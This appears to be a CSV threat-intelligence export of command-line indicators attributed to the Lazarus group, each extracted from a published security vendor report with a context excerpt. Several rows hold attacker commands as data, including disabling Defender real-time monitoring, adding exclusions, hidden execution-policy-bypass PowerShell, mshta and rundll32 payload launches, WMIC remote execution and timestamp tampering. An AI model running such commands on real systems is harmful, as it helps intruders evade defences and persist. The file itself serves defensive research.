schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--lazarus,artifact--sha256:01736246b495a3adc76dbf4d6aa6f6b1991242c371bcd6a61ce860ef8c4ee160,observation--sha256:43b3119082cd7cd16018522315e4e456413d803f128a150944f835c2547c2768,command,#Lazarus #Powershell,#Lazarus #Powershell,candidate,,unknown,unknown,not-stated,,source--lazarus--ac9aba9cb92fd0a4,lazarus/README.MD,"{""line"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,#Lazarus #Powershell,
1.0.0,actor--lazarus,artifact--sha256:26d7c26bc91be11d36613709cbb4a43452ab0b62c74c04fdc281a9a26bc2b921,observation--sha256:1d3de2154ac380d71bf51aebde02e9196774c11e4022dd2c0c6c19a533b93bfb,command,"$str_mask_1 = ""cmd.exe /c \""%s >> %s 2>&1\"""" ascii wide","$str_mask_1 = ""cmd.exe /c \""%s >> %s 2>&1\"""" ascii wide",candidate,2020-06-10T00:00:00Z,day,known,same-record,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure.com | © F-Secure LABS 22 author=""f-secure "" description=""Detects RC4 loop in Lazarus Group implant"" date=""2020-06-10"" strings: $str_rc4_loop = { 41 FE 8? 00 01 00 00 45 0F B6 ?? 00 01 00 00 48 FF C? 43 0F B6 0? ?? 41 00 8? 01 01 00 00 41 0F B6 ?? 01 01 00 00 } condition: int16(0) == 0x5a4d and filesize < 3000KB and $str_rc4_loop } rule lazarus_lssvc_ntuser_unpacked { meta: author=""f-secure"" description=""Detects unpacked variant of Lazarus Group implant"" date=""2020-06-10"" strings: $str_c",
1.0.0,actor--lazarus,artifact--sha256:717f242e3f9dfb2472adb243934a138635138ec4a881d148efaaf02680ac1410,observation--sha256:8c3ac2abcb6173e4bf7481dd50ff1dd75510922071dcb410d715fb8d8c10b00f,command,"$str_mask_2 = ""cmd.exe /c \""%s 2>> %s\"""" ascii wide","$str_mask_2 = ""cmd.exe /c \""%s 2>> %s\"""" ascii wide",candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure.com | © F-Secure LABS 23 $str_mask_2 = ""cmd.exe /c \""%s 2>> %s\"""" ascii wide $str_mask_3 = ""%s\\%s\\%s"" ascii wide $str_other_1 = ""perflog.dat"" ascii wide nocase $str_other_2 = ""perflog.evt"" ascii wide nocase $str_other_3 = ""cbstc.log"" ascii wide nocase $str_other_4 = ""LdrGetProcedureAddress"" ascii $str_other_5 = ""NtProtectVirtualMemory"" asci condition: int16(0) == 0x5a4d and filesize < 3000KB and 1 of ($str_netsh*) and 1 of ($str_mask*) and 1 of ($str_other*) }",
1.0.0,actor--lazarus,artifact--sha256:b95ba081257d610e0b3f1ee618598e9970d40158340bae55bf96dd05ca5175b5,observation--sha256:18eaab96217292ed85c56923bfc8c12d7fe6022b6cf81424cd5aec1e9b3eb09f,command,"/password:""[password]"" PROCESS CALL CREATE ""cmd /c sc queryex","/password:""[password]"" PROCESS CALL CREATE ""cmd /c sc queryex",candidate,,unknown,unknown,not-stated,2021-02-25T00:00:00Z,source--lazarus--f6685ba8150b853c,lazarus/kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225.pdf,"{""page"": 12}","[""activity--threatneedle""]","[""malware--threatneedle""]",[],[],1,false,medium,TLP:CLEAR,pdf-text,"LAZARUS TARGETS DEFENSE INDUSTRY WITH THREATNEEDLE 11 © 2021 AO KASPERSKY LAB Credential gathering During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document. One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command: • [Responder file path] -i [IP address] -rPv Several days later, the attacker started to move laterally originat",
1.0.0,actor--lazarus,artifact--sha256:d53a942b86dc0df2aa25e1b2aca63755cad1ee8030787a75057098b117277e8a,observation--sha256:d656d20aaccf5598e8e00517f2fe584018619b9bb7f67d2c08b7c172b108b3b6,command,"/password:""[password]"" PROCESS CALL CREATE ""cmd.exe /c","/password:""[password]"" PROCESS CALL CREATE ""cmd.exe /c",candidate,,unknown,unknown,not-stated,2021-02-25T00:00:00Z,source--lazarus--f6685ba8150b853c,lazarus/kaspersky-ics-cert-lazarus-targets-defense-industry-with-threatneedle-en-20210225.pdf,"{""page"": 12}","[""activity--threatneedle""]","[""malware--threatneedle""]",[],[],1,false,medium,TLP:CLEAR,pdf-text,"LAZARUS TARGETS DEFENSE INDUSTRY WITH THREATNEEDLE 11 © 2021 AO KASPERSKY LAB Credential gathering During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document. One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command: • [Responder file path] -i [IP address] -rPv Several days later, the attacker started to move laterally originat",
1.0.0,actor--lazarus,artifact--sha256:722351810b9b4ed6e70f151657f80d4a1ecb791baef3e7afe166a2d0ddf855f8,observation--sha256:389cee57254183efddcc11fa86af24beff0032ed5af1ce2164709b231b4a525f,command,14fee51bb001abb6ea2c0d8c78863a0d - Malicious PowerShell script,14fee51bb001abb6ea2c0d8c78863a0d - Malicious PowerShell script,candidate,,unknown,unknown,not-stated,,source--lazarus--c328e6a5abab4da3,lazarus/MATA/Updated-MATA-attacks-Eastern-Europe_full-report_ENG.pdf,"{""page"": 58}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"57 © 2023 AO KASPERSKY LAB 25. Conduct an off-schedule scan of all removable data media used in the organization with an antimalware solution and using the Indicators of Compromise provided. 26. We also recommend, irrespective of whether signs of an information security incident are present or not, that Kaspersky Security Center settings be brought in line with the best practices described in the Hardening Guide: https://support.kaspersky.com/KSC/14.2/en-US/245736.htm Indicators of Compromise Fi",
1.0.0,actor--lazarus,artifact--sha256:8a800f7b7245e5bdcdad6d615e24732fa69e1eef47a0e9867b058ec6a8e2a83f,observation--sha256:655e9618fd078d03dca25ea5a337522e3a18a247b1c193a66303183d9209d80c,command,1� Check if scheduled task exists: schtasks | findstr XXXX,1� Check if scheduled task exists: schtasks | findstr XXXX,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 TLP:CLEAR Intrusion activity breakdown Most of the malicious activity was conducted through the established implant. However , during the final two days of the intrusion, we observed additional actions executed over RDP and Impacket, likely facilitated by a reverse proxy or tunnel created via the implant� On the final day , the threat actor also briefly moved laterally to an adjacent host, deploying the same implant as a scheduled task and executing several tools and commands. Persistence via ",
1.0.0,actor--lazarus,artifact--sha256:eaf1a9f3f094c8b577f348bc9b9215a2c69e8a960f0c84f9e54ee7170802283f,observation--sha256:bff6b29d48e5c517ca61f5433259168068acf6fe3ce78418ddd1d56ce0053400,command,1� powershell (Get-Item “XXXX”).CreationTime = (Get-Date,1� powershell (Get-Item “XXXX”).CreationTime = (Get-Date,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 TLP:CLEAR Gather information on user/machine Modify time attributes Artifact removal RDP-related activity As part of their overall information gathering and reconnaissance activities, the threat actor gathered information on the victim host and user accounts� Some executed commands included: 1� systeminfo 2� whoami 3� query user 4� net localgroup administrators 5� net user The threat actor deployed an unknown tool (named “t�exe”) onto the hosts through the implant (first host) and RDP (adjacen",
1.0.0,actor--lazarus,artifact--sha256:01f695759a3e79bad4ae2453679c9e989498cd073714fc09f6f5fc4967a36827,observation--sha256:6f19929c6b6bc21d30503adbbf54f323cb4e1a801f5362a4120690e6449ceb73,command,1� powershell Get-MpPreference | findstr DisableRealtimeMonitoring,1� powershell Get-MpPreference | findstr DisableRealtimeMonitoring,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:0ee38a60990d653519e774b5cac9439ca7d8c9aacb0f3ac5b7df31c68e9948da,observation--sha256:73b87fa963707678fab1e654504b0034c1f499a5abea5c96cd90b5f284f48ae6,command,1� powershell Get-MpPreference | findstr Exclusion,1� powershell Get-MpPreference | findstr Exclusion,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:5db05b157b15977379e12a3e29dbab390cd086ec94ca741ae39418e3e70f7fb2,observation--sha256:e3b930007cdb2791b5c141eea7b9d38f213f7ed8611b637f8b683a0de6fee242,command,1� powershell “Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties,1� powershell “Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 TLP:CLEAR Intrusion activity breakdown Most of the malicious activity was conducted through the established implant. However , during the final two days of the intrusion, we observed additional actions executed over RDP and Impacket, likely facilitated by a reverse proxy or tunnel created via the implant� On the final day , the threat actor also briefly moved laterally to an adjacent host, deploying the same implant as a scheduled task and executing several tools and commands. Persistence via ",
1.0.0,actor--lazarus,artifact--sha256:27c9386196511419871b9c3ff0bce8ce89ef1b382e082d0434ec84040249de2c,observation--sha256:2a38413800bb0fd963f545091a87a388afb23c50eebbee7f2f770c63a702a853,command,2023-04-07 16:33:12 rundll32.exe usosh.cpl Creates executable file java8.exe,2023-04-07 16:33:12 rundll32.exe usosh.cpl Creates executable file java8.exe,candidate,2023-04-07T00:00:00Z,day,known,same-record,2023-10-13T00:00:00Z,source--lazarus--5b1c7d47526d5157,lazarus/20231013_Lazarus_OP.Dream_Magic.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Dream Magic 보고서 34 [그림 16] Acrobat.tmp 실행으로 정보 추출 예시 브라우저의 자동 완성 기능은 각 홈페이지마다 사용자의 계정 정보를 저장한 후 재 접속 시 자동으로 입력해 주기 때문에 사용자에게 편리성을 제공하지만 보안 측면에서 좋은 기능은 아닙니다. Acrobat.tmp 와 같은 악성코드에 의해서 정보 추출이 가능하고 외부로 유출되어 악용 가능성이 있으므로 브라우저의 자동 완성 기능은 가급적 사용하지 않는 것이 좋으며 사용자 자신만의 비밀번호 규칙을 만들어서 사용하는 것이 좋습니다. FastCopy.exe처럼 공개된 자원을 악용하면 해킹 조직을 특정하는 것은 어려울 수 있습니다. 악성코드의 연관 관계가 파악되지 않은 상태에서 Acrobat.tmp만으로 해킹 조직을 특정하는 것은 어려울 수 있지만 Lazarus 조직의 악성코드를 분석해본 경험이 있는 분석가라면 에서 자주 사용하는 패턴임을 의심해 볼 수 있습니다. 하지만 이 역시 의심이므,
1.0.0,actor--lazarus,artifact--sha256:6bebbdd6f86e3cb1f9dcbd496f79e73129ac09972002856c4af3ce076e217341,observation--sha256:f1ffd43c5547e53dae1093e9bcea3149a0f8e7ca90f4ed91bb9111c3847e3d8d,command,2� Create scheduled task: schtasks /create /tn XXXX /tr XXXX /sc daily /st,2� Create scheduled task: schtasks /create /tn XXXX /tr XXXX /sc daily /st,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 TLP:CLEAR Intrusion activity breakdown Most of the malicious activity was conducted through the established implant. However , during the final two days of the intrusion, we observed additional actions executed over RDP and Impacket, likely facilitated by a reverse proxy or tunnel created via the implant� On the final day , the threat actor also briefly moved laterally to an adjacent host, deploying the same implant as a scheduled task and executing several tools and commands. Persistence via ",
1.0.0,actor--lazarus,artifact--sha256:c353b780c14bf766e7553bcc02bbfffe5ef3736cd2728e838260e7408da25dde,observation--sha256:912655ce6a4267ec0b4afb5bbc24554411969b970c6bdfb8a5894d1c0ea6f106,command,2� powershell (Get-Item “C:\TestFolder”).LastWriteTime =,2� powershell (Get-Item “C:\TestFolder”).LastWriteTime =,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 TLP:CLEAR Gather information on user/machine Modify time attributes Artifact removal RDP-related activity As part of their overall information gathering and reconnaissance activities, the threat actor gathered information on the victim host and user accounts� Some executed commands included: 1� systeminfo 2� whoami 3� query user 4� net localgroup administrators 5� net user The threat actor deployed an unknown tool (named “t�exe”) onto the hosts through the implant (first host) and RDP (adjacen",
1.0.0,actor--lazarus,artifact--sha256:dedcbf55f6feecf82ca671bf9b67c7a66e72be1d0d4be43ff41c0488bede68ca,observation--sha256:e3532177c86ba02379914a98ab8e64da5cd363f80b55e1a2ec28bb7520368456,command,2� powershell -Command Add-MpPreference -ExclusionPath “C:\Windows”,2� powershell -Command Add-MpPreference -ExclusionPath “C:\Windows”,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:8c7452b9b74e36ac5bc96406add1fd08641d1cfdbf81adb54203b337b64a1bfa,observation--sha256:caff6b7e5d802358c514083027a82b281c5a18fd9805706a766801d7219cb045,command,2� powershell Set-MpPreference -DisableRealtimeMonitoring 1,2� powershell Set-MpPreference -DisableRealtimeMonitoring 1,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:0a48dcfe89e8efedda8dbf86e50a544eb39b84f1d38383242f81c72251190752,observation--sha256:c1d46ff5372433f4bf15ac7602f9d3dc56b3b0ec47d57af06b613bd455d6b5a8,command,"2� wmic diskdrive get size,model","2� wmic diskdrive get size,model",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:e485c97a5dcc1b0750dbbfe6a89fa8fa94e7ad3946eba2da06eb9d31438603b3,observation--sha256:b63e8640c224b8719d105e3a109f2f1235f06877c4d702e87c8f92bd40216784,command,3� Force run scheduled task (starting the implant right away): schtasks /run /tn,3� Force run scheduled task (starting the implant right away): schtasks /run /tn,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 TLP:CLEAR Intrusion activity breakdown Most of the malicious activity was conducted through the established implant. However , during the final two days of the intrusion, we observed additional actions executed over RDP and Impacket, likely facilitated by a reverse proxy or tunnel created via the implant� On the final day , the threat actor also briefly moved laterally to an adjacent host, deploying the same implant as a scheduled task and executing several tools and commands. Persistence via ",
1.0.0,actor--lazarus,artifact--sha256:8c7e5d543bbee8f34bf464dc60b5c1b8494708844c69a39f7847687b3ff0e4a9,observation--sha256:67326b7b70b007a19b359b8bff45dca957755c1f933b8801581c175f58020e0f,command,3� powershell (Get-Item “XXXX”).LastWriteTime = (Get-,3� powershell (Get-Item “XXXX”).LastWriteTime = (Get-,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 TLP:CLEAR Gather information on user/machine Modify time attributes Artifact removal RDP-related activity As part of their overall information gathering and reconnaissance activities, the threat actor gathered information on the victim host and user accounts� Some executed commands included: 1� systeminfo 2� whoami 3� query user 4� net localgroup administrators 5� net user The threat actor deployed an unknown tool (named “t�exe”) onto the hosts through the implant (first host) and RDP (adjacen",
1.0.0,actor--lazarus,artifact--sha256:38332e568a3206d4c0aff20ac94191c423602e6147e0b60e14833892f0e5c151,observation--sha256:23a29049259bece593eb0b899b4b612a06d0f01fc9eec3cb49bbc8f11b3270ef,command,"3� wmic logicaldisk get filesystem,name,size","3� wmic logicaldisk get filesystem,name,size",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:f4730768824d740ae68a9b832676d967e52baeca6af6a195b0f30a0bcfec7580,observation--sha256:c55cd83c97fbe3f7708c2fa4f0b2ea6f6a2ef6aba46a3889740e630f8f73da32,command,4� powershell Set-MpPreference -DisableRealtimeMonitoring 0,4� powershell Set-MpPreference -DisableRealtimeMonitoring 0,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:52f6fb8140dcf2d2703058c058ed6ffd096819937edf32176cd55a758388af3e,observation--sha256:b8cecfb72645375c699f590fc21caa466afcec325e97099294e292a4a8c48ad8,command,"4� wmic logicaldisk get name, drivetype, filesystem, size","4� wmic logicaldisk get name, drivetype, filesystem, size",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--lazarus--af801ed889f0a493,lazarus/Andariel/WithSecure_Andariel_2025.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 TLP:CLEAR Drive and disk discovery Modify Windows Defender settings The threat actor looked for connected disks and drives via WMI and for iSCSI storages� These set of actions were most likely done as a pre-cursor to enable data theft and exfiltration of sensitive documents. This was achieved through commands including: 1� iscsicli sessionlist 2� wmic diskdrive get size,model 3� wmic logicaldisk get filesystem,name,size 4� wmic logicaldisk get name, drivetype, filesystem, size The threat actor",
1.0.0,actor--lazarus,artifact--sha256:e5d206ca7ca70cd71d2d6911ff87022ac479e2edbb3b620ea6a6dbbffd4d433b,observation--sha256:c864d8d617b91049e2624bb18ffac5ea675a90aa25e8467ca61941f7510a9be9,command,A PowerShell script was executed to download additional payloads early,A PowerShell script was executed to download additional payloads early,candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,F-Secure.com | © F-Secure LABS 20 Malicious Document & Archive Hashes (SHA256) 09f0e82a3bad997c32605a1d3f9e40a0489b587af188fd05d4506358f2e890b4 a464781b616c86bbd68dbf909826444f7fd6c6ae378caf074926df7aebc4e3a1 7f60e13ed2e35bb2cfe4e243c71532b65d54f8b61ae7e7e789c125d274cdd3fe 306deba9a8dbb6f5ab88f2386cbe1d46735231fdc680be65d1b6654b1f9950fc b050545a7ffcbbcf96dc79354a6988fcc2f55bc76b67b59eaab36e7d238a7f62 997c4f7695a6a615da069d5f839582fdb83f215bc999e8af492636b2b5e3436c 1533374acf886bc3015c4cba3da1c67,
1.0.0,actor--lazarus,artifact--sha256:6ecb8e9ced8d20a7887ff4293917137ebdcf946c4ebe4315e22dd8e9ad7d90ba,observation--sha256:c6d79f29f753b473bbd9d0ee21c5b1bac41cfcb5ddfe4522ae5172067780ab58,command,A malicious mshta command was executed as a result of the phishing,A malicious mshta command was executed as a result of the phishing,candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,F-Secure.com | © F-Secure LABS 20 Malicious Document & Archive Hashes (SHA256) 09f0e82a3bad997c32605a1d3f9e40a0489b587af188fd05d4506358f2e890b4 a464781b616c86bbd68dbf909826444f7fd6c6ae378caf074926df7aebc4e3a1 7f60e13ed2e35bb2cfe4e243c71532b65d54f8b61ae7e7e789c125d274cdd3fe 306deba9a8dbb6f5ab88f2386cbe1d46735231fdc680be65d1b6654b1f9950fc b050545a7ffcbbcf96dc79354a6988fcc2f55bc76b67b59eaab36e7d238a7f62 997c4f7695a6a615da069d5f839582fdb83f215bc999e8af492636b2b5e3436c 1533374acf886bc3015c4cba3da1c67,
1.0.0,actor--lazarus,artifact--sha256:9e1ae9af94e0d404594cd837a8d9df7f91f0c22f413d515d729727959d0444bc,observation--sha256:a7e8cf747bbfb516bc88d2803007c4459ef5305eb85ef4d4db381420fc28406b,command,"After sending the data to the C2 server, the malware receives a response from it. It contains the main payload also encrypted with its own algorithm. It is either executed in the process memory or uploaded to the hard disk at: %localappdata%\~DMF[0-9]{4}.tmp (the path is given in RegExp format) and launched using rundll32.exe. The version of payload execution is determined by the response of the C2 server.","After sending the data to the C2 server, the malware receives a response from it. It contains the main payload also encrypted with its own algorithm. It is either executed in the process memory or uploaded to the hard disk at: %localappdata%\~DMF[0-9]{4}.tmp (the path is given in RegExp format) and launched using rundll32.exe. The version of payload execution is determined by the response of the C2 server",candidate,2020-09-24T00:00:00Z,day,known,same-record,,source--lazarus--09f2fa073008f6e1,lazarus/Lazarus Group Recruitment_ Threat Hunters vs Head Hunters.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 12. Example of a stub 3. Trojan-Downloader Agamemnon If successful, the malicious macro extracts the decrypted data to the file 963e8cfaa40226ba2e5d516464572446 in the directory C:\ProgramData\regid.mdb and runs the library with the following parameters: rundll32.exe C:\ProgramData\regid.mdb,sqlite3_create_functionex X4BJOPK3O6nxwkVuK3HqqTt4 LRTB /QV3AcjAeAb/x3xH+0ZhyOBJfZXilGFS69N5E/rSe2z47XDp8uh37v2vZ6/zrkkg9KFobffsQyr5q0Urx6pxtP31eXHG8ER2xfd/t8/2SjjQeXOF8oR6guvDbIPownS85T1uOfD4YX7tv2T/",
1.0.0,actor--lazarus,artifact--sha256:61921e0b70ed5fc6b11a5b38f352548b81204c9b72abe318f795b9631f374512,observation--sha256:cc94a47dcccab50006d9f3a3bf47076744bb0f4ff79123e9617c2d2f4be6cc0c,command,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden -ep Bypass,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w Hidden -ep Bypass,candidate,,unknown,unknown,not-stated,,source--lazarus--5dbd54be61ed2947,lazarus/lazarus-threat-intel-report2.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure.com | © F-Secure LABS 5 mshta.exe https://bit[.]ly/2vwLE0m The link was accessed 73 times from several countries, as noted in Figure 6 below. Some of these were likely researchers, however, the spike in May, and the countries with high counts, led F-Secure to assess that this was a relatively widely-targeted lure document. Figure 6: “bit.ly” link access statistics The “bit.ly” link redirected to a domain from which a VBScript was executed to perform checks on the host and collect furthe",
1.0.0,actor--lazarus,artifact--sha256:03ff49f10d8f8b9d0f0933890ff314f4dad235f02c34d4e60aab70b7ebdc2ea7,observation--sha256:0043ddd4e9372f64745641b867c16931c2825961a6081ae629ae3df14aebcdc6,command,"C:\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db"", CtrlPanel S-6-81-","C:\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db"", CtrlPanel S-6-81-",candidate,,unknown,unknown,not-stated,,source--lazarus--3c464a6b801a4714,lazarus/Dream-Job-Campaign.pdf,"{""page"": 30}","[""activity--dream-job""]",[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 30 | P a g e Operation ‘Dream Job’ Each file is packed using Packer Themida, evident from the _+CTRL string: The file is downloaded to varying folders on the infected machine. For example: C:\ProgramData\",
